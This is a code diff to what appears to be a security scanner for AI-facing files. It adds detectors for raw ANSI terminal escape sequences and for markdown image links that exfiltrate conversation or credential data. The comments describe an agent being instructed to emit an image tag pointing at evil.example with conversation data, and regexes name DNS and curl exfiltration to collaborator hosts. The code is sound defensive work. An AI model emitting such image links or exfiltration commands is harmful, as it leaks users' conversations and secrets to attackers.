@@ -66,15 +66,32 @@ def _tag_char(cp: int) -> bool:
     return 0xE0000 <= cp <= 0xE007F
 
 
+#: ESC (0x1B) followed by '[' -- the CSI (Control Sequence Introducer) that opens
+#: every ANSI cursor-movement, color, and (via OSC 8, ESC ']') hyperlink escape.
+#: 🔴 Added 2026-09-02 per references/audits/2026-09-02-aisec-competitor-survey.md
+#: (garak's probes.ansiescape): a raw escape sequence in a file that gets printed
+#: to a terminal -- a log line, a tool's own output template, an agent's response
+#: rendered raw -- can move the cursor, overwrite what a reviewer sees, or forge a
+#: clickable hyperlink to a malicious URL. Same threat shape as the Unicode
+#: HIDDEN_CONTENT detectors above: content that reads one way to the byte stream
+#: and another way once rendered. Scoped to the RAW byte (0x1B), not its escaped
+#: textual spelling ("\\x1b", "\\033") in source, which is a much noisier signal
+#: (present in any terminal-color library) and not attempted here.
+_ESC = "\x1b"
+
+
 def _scan_unicode(text: str, rel: str) -> list:
     out: list = []
     line_no = 1
     inv_hits, bidi_hits, tag_hits = {}, {}, 0
+    ansi_hits = {}
     tag_first_line = None
+    prev_ch = ""
     for ch in text:
         cp = ord(ch)
         if ch == "\n":
             line_no += 1
+            prev_ch = ch
             continue
         if _tag_char(cp):
             tag_hits += 1
@@ -84,6 +101,10 @@ def _scan_unicode(text: str, rel: str) -> list:
             bidi_hits.setdefault(line_no, BIDI[cp])
         elif cp in INVISIBLE:
             inv_hits.setdefault(line_no, INVISIBLE[cp])
+        elif ch == "[" and prev_ch == _ESC:
+            ansi_hits.setdefault(line_no, 0)
+            ansi_hits[line_no] += 1
+        prev_ch = ch
 
     if tag_hits:
         out.append(Finding(
@@ -97,6 +118,21 @@ def _scan_unicode(text: str, rel: str) -> list:
             snippet=f"{tag_hits} invisible tag character(s)",
             fix="Strip Tag-block characters from all model-facing text; treat their presence as hostile.",
             cwe="CWE-1007", owasp="LLM01: Prompt Injection", references=[REF_LLM],
+        ))
+    for ln, count in list(ansi_hits.items())[:20]:
+        out.append(Finding(
+            engine="aisec", rule_id="ansi-escape-sequence",
+            title="Raw ANSI/CSI terminal escape sequence",
+            severity=Severity.MEDIUM, confidence=Confidence.MEDIUM,
+            file=rel, line=ln, category="HIDDEN_CONTENT",
+            description=(f"{count} raw ESC+'[' (CSI) sequence(s) found. A terminal escape sequence "
+                        "in text that gets printed raw -- a log line, a tool's output template, an "
+                        "agent's rendered response -- can move the cursor, overwrite what a reviewer "
+                        "sees on screen, or (via OSC 8) forge a clickable hyperlink to a malicious "
+                        "URL while the visible label stays innocuous."),
+            snippet=f"{count} raw ANSI escape sequence(s)",
+            fix="Strip or escape raw ESC bytes before the content is rendered in a terminal.",
+            cwe="CWE-150", owasp="LLM01: Prompt Injection", references=[REF_LLM],
         ))
     for ln, name in list(bidi_hits.items())[:20]:
         out.append(Finding(
@@ -320,6 +356,21 @@ EXFIL = [
      re.compile(r"(?i)\b(nslookup|dig|host)\b[^\n]{0,60}\$\(|\bcurl\b[^\n]{0,60}\.(?:oast|burpcollaborator|interact\.sh|requestbin)\b"),
      Severity.MEDIUM, Confidence.LOW, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
      "Dynamic hostname lookups can smuggle data out over DNS; verify the destination."),
+
+    # 🔴 Added 2026-09-02 per references/audits/2026-09-02-aisec-competitor-survey.md
+    # (garak's probes.web_injection): a zero-click exfiltration vector needing no
+    # shell command at all. A markdown image tag renders by fetching its URL
+    # automatically the moment the markdown is displayed -- an agent instructed to
+    # emit `![x](https://evil.example/?d=<conversation data>)` in its own response,
+    # or a file whose content an agent is told to render, exfiltrates the instant
+    # it's shown, before any human reads it. Every EXFIL rule above this one is
+    # shell/network-command shaped; none would catch this.
+    ("markdown-image-exfil", "Markdown image/link with data-shaped query string",
+     re.compile(r"!?\[[^\]\n]*\]\(\s*https?://[^\s)]+\?[^\s)]{0,300}(?:conversation|context|history|session|"
+                r"transcript|secret|token|key|credential|data|dump)[^\s)]{0,200}\)", re.IGNORECASE),
+     Severity.HIGH, Confidence.MEDIUM, "EXFIL", "CWE-200", "LLM06: Sensitive Information Disclosure",
+     "A markdown image/link renders (and fetches its URL) automatically on display. Never embed "
+     "conversation, session, or credential data in a URL an agent is instructed to render."),
 ]
 
 # --------------------------------------------------------------------------- #
